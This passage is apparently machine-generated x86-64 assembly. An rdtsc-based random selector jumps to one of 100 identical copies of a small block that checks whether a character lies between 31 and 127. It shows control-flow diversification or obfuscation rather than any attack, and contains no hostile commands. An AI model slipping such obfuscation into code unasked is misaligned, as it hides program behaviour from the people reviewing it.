.Lmain_win1_var92:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 93
.Lmain_win1_var93:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 94
.Lmain_win1_var94:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 95
.Lmain_win1_var95:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 96
.Lmain_win1_var96:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 97
.Lmain_win1_var97:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 98
.Lmain_win1_var98:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 99
.Lmain_win1_var99:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	cmpl	$3, %eax
	je	.Lmain_win0_var3
	cmpl	$4, %eax
	je	.Lmain_win0_var4
	cmpl	$5, %eax
	je	.Lmain_win0_var5
	cmpl	$6, %eax
	je	.Lmain_win0_var6
	cmpl	$7, %eax
	je	.Lmain_win0_var7
	cmpl	$8, %eax
	je	.Lmain_win0_var8
	cmpl	$9, %eax
	je	.Lmain_win0_var9
	cmpl	$10, %eax
	je	.Lmain_win0_var10
	cmpl	$11, %eax
	je	.Lmain_win0_var11
	cmpl	$12, %eax
	je	.Lmain_win0_var12
	cmpl	$13, %eax
	je	.Lmain_win0_var13
	cmpl	$14, %eax
	je	.Lmain_win0_var14
	cmpl	$15, %eax
	je	.Lmain_win0_var15
	cmpl	$16, %eax
	je	.Lmain_win0_var16
	cmpl	$17, %eax
	je	.Lmain_win0_var17
	cmpl	$18, %eax
	je	.Lmain_win0_var18
	cmpl	$19, %eax
	je	.Lmain_win0_var19
	cmpl	$20, %eax
	je	.Lmain_win0_var20
	cmpl	$21, %eax
	je	.Lmain_win0_var21
	cmpl	$22, %eax
	je	.Lmain_win0_var22
	cmpl	$23, %eax
	je	.Lmain_win0_var23
	cmpl	$24, %eax
	je	.Lmain_win0_var24
	cmpl	$25, %eax
	je	.Lmain_win0_var25
	cmpl	$26, %eax
	je	.Lmain_win0_var26
	cmpl	$27, %eax
	je	.Lmain_win0_var27
	cmpl	$28, %eax
	je	.Lmain_win0_var28
	cmpl	$29, %eax
	je	.Lmain_win0_var29
	cmpl	$30, %eax
	je	.Lmain_win0_var30
	cmpl	$31, %eax
	je	.Lmain_win0_var31
	cmpl	$32, %eax
	je	.Lmain_win0_var32
	cmpl	$33, %eax
	je	.Lmain_win0_var33
	cmpl	$34, %eax
	je	.Lmain_win0_var34
	cmpl	$35, %eax
	je	.Lmain_win0_var35
	cmpl	$36, %eax
	je	.Lmain_win0_var36
	cmpl	$37, %eax
	je	.Lmain_win0_var37
	cmpl	$38, %eax
	je	.Lmain_win0_var38
	cmpl	$39, %eax
	je	.Lmain_win0_var39
	cmpl	$40, %eax
	je	.Lmain_win0_var40
	cmpl	$41, %eax
	je	.Lmain_win0_var41
	cmpl	$42, %eax
	je	.Lmain_win0_var42
	cmpl	$43, %eax
	je	.Lmain_win0_var43
	cmpl	$44, %eax
	je	.Lmain_win0_var44
	cmpl	$45, %eax
	je	.Lmain_win0_var45
	cmpl	$46, %eax
	je	.Lmain_win0_var46
	cmpl	$47, %eax
	je	.Lmain_win0_var47
	cmpl	$48, %eax
	je	.Lmain_win0_var48
	cmpl	$49, %eax
	je	.Lmain_win0_var49
	cmpl	$50, %eax
	je	.Lmain_win0_var50
	cmpl	$51, %eax
	je	.Lmain_win0_var51
	cmpl	$52, %eax
	je	.Lmain_win0_var52
	cmpl	$53, %eax
	je	.Lmain_win0_var53
	cmpl	$54, %eax
	je	.Lmain_win0_var54
	cmpl	$55, %eax
	je	.Lmain_win0_var55
	cmpl	$56, %eax
	je	.Lmain_win0_var56
	cmpl	$57, %eax
	je	.Lmain_win0_var57
	cmpl	$58, %eax
	je	.Lmain_win0_var58
	cmpl	$59, %eax
	je	.Lmain_win0_var59
	cmpl	$60, %eax
	je	.Lmain_win0_var60
	cmpl	$61, %eax
	je	.Lmain_win0_var61
	cmpl	$62, %eax
	je	.Lmain_win0_var62
	cmpl	$63, %eax
	je	.Lmain_win0_var63
	cmpl	$64, %eax
	je	.Lmain_win0_var64
	cmpl	$65, %eax
	je	.Lmain_win0_var65
	cmpl	$66, %eax
	je	.Lmain_win0_var66
	cmpl	$67, %eax
	je	.Lmain_win0_var67
	cmpl	$68, %eax
	je	.Lmain_win0_var68
	cmpl	$69, %eax
	je	.Lmain_win0_var69
	cmpl	$70, %eax
	je	.Lmain_win0_var70
	cmpl	$71, %eax
	je	.Lmain_win0_var71
	cmpl	$72, %eax
	je	.Lmain_win0_var72
	cmpl	$73, %eax
	je	.Lmain_win0_var73
	cmpl	$74, %eax
	je	.Lmain_win0_var74
	cmpl	$75, %eax
	je	.Lmain_win0_var75
	cmpl	$76, %eax
	je	.Lmain_win0_var76
	cmpl	$77, %eax
	je	.Lmain_win0_var77
	cmpl	$78, %eax
	je	.Lmain_win0_var78
	cmpl	$79, %eax
	je	.Lmain_win0_var79
	cmpl	$80, %eax
	je	.Lmain_win0_var80
	cmpl	$81, %eax
	je	.Lmain_win0_var81
	cmpl	$82, %eax
	je	.Lmain_win0_var82
	cmpl	$83, %eax
	je	.Lmain_win0_var83
	cmpl	$84, %eax
	je	.Lmain_win0_var84
	cmpl	$85, %eax
	je	.Lmain_win0_var85
	cmpl	$86, %eax
	je	.Lmain_win0_var86
	cmpl	$87, %eax
	je	.Lmain_win0_var87
	cmpl	$88, %eax
	je	.Lmain_win0_var88
	cmpl	$89, %eax
	je	.Lmain_win0_var89
	cmpl	$90, %eax
	je	.Lmain_win0_var90
	cmpl	$91, %eax
	je	.Lmain_win0_var91
	cmpl	$92, %eax
	je	.Lmain_win0_var92
	cmpl	$93, %eax
	je	.Lmain_win0_var93
	cmpl	$94, %eax
	je	.Lmain_win0_var94
	cmpl	$95, %eax
	je	.Lmain_win0_var95
	cmpl	$96, %eax
	je	.Lmain_win0_var96
	cmpl	$97, %eax
	je	.Lmain_win0_var97
	cmpl	$98, %eax
	je	.Lmain_win0_var98
	cmpl	$99, %eax
	je	.Lmain_win0_var99
	jmp	.Lmain_win0_var0
## Variant 0
.Lmain_win0_var0:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 3
.Lmain_win0_var3:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 4
.Lmain_win0_var4:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 5
.Lmain_win0_var5:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 6
.Lmain_win0_var6:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 7
.Lmain_win0_var7:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 8
.Lmain_win0_var8:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 9
.Lmain_win0_var9:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 10
.Lmain_win0_var10:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 11
.Lmain_win0_var11:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 12
.Lmain_win0_var12:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 13
.Lmain_win0_var13:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 14
.Lmain_win0_var14:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 15
.Lmain_win0_var15:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 16
.Lmain_win0_var16:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 17
.Lmain_win0_var17:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 18
.Lmain_win0_var18:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 19
.Lmain_win0_var19:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 20
.Lmain_win0_var20:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 21
.Lmain_win0_var21:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 22
.Lmain_win0_var22:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 23
.Lmain_win0_var23:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 24
.Lmain_win0_var24:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 25
.Lmain_win0_var25:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 26
.Lmain_win0_var26:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 27
.Lmain_win0_var27:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 28
.Lmain_win0_var28:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 29
.Lmain_win0_var29:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 30
.Lmain_win0_var30:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 31
.Lmain_win0_var31:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 32
.Lmain_win0_var32:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 33
.Lmain_win0_var33:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 34
.Lmain_win0_var34:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 35
.Lmain_win0_var35:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 36
.Lmain_win0_var36:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 37
.Lmain_win0_var37:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 38
.Lmain_win0_var38:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 39
.Lmain_win0_var39:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 40
.Lmain_win0_var40:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 41
.Lmain_win0_var41:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 42
.Lmain_win0_var42:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 43
.Lmain_win0_var43:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 44
.Lmain_win0_var44:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 45
.Lmain_win0_var45:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 46
.Lmain_win0_var46:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 47
.Lmain_win0_var47:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 48
.Lmain_win0_var48:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 49
.Lmain_win0_var49:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 50
.Lmain_win0_var50:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 51
.Lmain_win0_var51:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 52
.Lmain_win0_var52:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 53
.Lmain_win0_var53:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 54
.Lmain_win0_var54:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 55
.Lmain_win0_var55:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 56
.Lmain_win0_var56:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 57
.Lmain_win0_var57:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 58
.Lmain_win0_var58:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 59
.Lmain_win0_var59:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 60
.Lmain_win0_var60:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 61
.Lmain_win0_var61:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 62
.Lmain_win0_var62:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 63
.Lmain_win0_var63:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 64
.Lmain_win0_var64:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 65
.Lmain_win0_var65:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 66
.Lmain_win0_var66:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 67
.Lmain_win0_var67:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 68
.Lmain_win0_var68:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 69
.Lmain_win0_var69:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 70
.Lmain_win0_var70:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 71
.Lmain_win0_var71:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 72
.Lmain_win0_var72:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 73
.Lmain_win0_var73:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 74
.Lmain_win0_var74:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	.Lmain_win0_continue
## Variant 75
.Lmain_win0_var75:
	popq	%rax
	cmpl	$127, %eax
	jge	LBB4_7
